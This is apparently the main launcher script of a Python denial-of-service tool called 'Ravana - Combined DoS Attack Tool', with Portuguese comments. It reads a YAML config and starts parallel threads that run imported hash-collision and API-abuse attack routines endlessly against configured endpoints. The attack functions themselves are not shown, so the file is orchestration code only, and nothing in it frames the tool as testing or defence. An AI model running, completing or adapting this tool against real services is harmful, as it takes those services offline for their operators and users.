import sys
import os
import threading
import argparse
import yaml
from scripts.hash_collision import infinite_hash_collision
from scripts.api_abuse import infinite_abuse_api

# Configura o caminho de importação para incluir o diretório 'scripts'
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), 'scripts')))

# Função para carregar a configuração do arquivo YML
def load_config(file_path):
    with open(file_path, 'r') as file:
        return yaml.safe_load(file)

# Função para criar argumentos da linha de comando
def parse_args():
    parser = argparse.ArgumentParser(description="Ravana - Combined DoS Attack Tool")
    
    parser.add_argument('--config', type=str, default="config/config_combined.yml",
                        help='Caminho para o arquivo de configuração YAML (padrão: config/config_combined.yml)')
    
    return parser.parse_args()

# Função principal para rodar o ataque combinado
def run_combined_attack(config):
    if config.get('run_hash', False):
        hash_endpoint = config['hash_collision']['endpoint']
        hash_thread = threading.Thread(target=infinite_hash_collision, args=(config['hash_collision'], hash_endpoint, config['general']['threads']))
        hash_thread.start()

    if config.get('run_api', False):
        api_endpoint = config['api_abuse']['endpoint']
        api_thread = threading.Thread(target=infinite_abuse_api, args=(config['api_abuse'], api_endpoint, config['general']['threads']))
        api_thread.start()

    # Manter o script rodando enquanto os ataques estão em execução
    if config.get('run_hash', False):
        hash_thread.join()
    if config.get('run_api', False):
        api_thread.join()

# Execução principal
if __name__ == "__main__":
    args = parse_args()
    config = load_config(args.config)
    run_combined_attack(config)
